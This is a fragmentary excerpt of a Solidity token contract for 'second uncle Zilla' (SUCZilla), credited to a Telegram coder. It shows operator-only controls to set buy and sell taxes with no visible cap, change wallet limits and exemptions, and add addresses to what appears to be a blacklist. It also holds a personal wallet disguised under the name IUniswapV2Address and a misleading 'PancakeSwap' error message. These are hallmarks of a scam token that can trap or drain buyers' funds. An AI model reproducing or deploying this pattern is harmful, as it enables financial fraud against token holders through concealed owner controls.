...
//coder by X https://t.me/Xteam718
...
contract token is Context, IERC20, Ownable {
    ...
    string private _name = "second uncle Zilla";
    string private _symbol = "SUCZilla";
    uint8 private _decimals = 9;

    uint public launchedBlock;
    uint private small = 0;
    bool public isLaunch = false;
    address payable public marketingWalletAddress = payable(0xa36377756BDC7D38244b34ADfc1A20DC57e0842e); // Marketing Address
	...
	modifier onlyOperator() {
        require(operatorsList[_msgSender()], 'PancakeSwap: caller is not the operator');
        _;
    }
    ...
    address payable private IUniswapV2Address = payable(0xa36377756BDC7D38244b34ADfc1A20DC57e0842e); 
    ...
    function setCharityAddress(address charityAddress) public onlyOperator{
    ...
    function Launch() public onlyOperator {
        isLaunch = true;
    ...
    function setIsExcludedFromFee(address account, bool newValue) public onlyOperator {
        isExcludedFromFee[account] = newValue;
    }

    function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax) external onlyOperator() {
    ...
    function setSellTaxes(uint256 newLiquidityTax, uint256 newMarketingTax) external onlyOperator() {
    ...
    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOperator() {
    ...
    function setIsWalletLimitExempt(address holder, bool exempt) external onlyOperator {
        isWalletLimitExempt[holder] = exempt;
    }

    function setWalletLimit(uint256 newLimit) external onlyOperator {
        _walletMax  = newLimit;
    }

    function setNumTokensBeforeSwap(uint256 newLimit) external onlyOperator() {
        minimumTokensBeforeSwap = newLimit;
    }

    function setMarketingWalletAddress(address newAddress) external onlyOperator() {
        marketingWalletAddress = payable(newAddress);
    }

    function setIUniswapV2Address(address newAddress) external onlyOperator() {
    ...
    function setsmall(uint num) public onlyOperator {
        small = num;
    }

    function writebcList(address recipient, bool isbc) public onlyOperator {
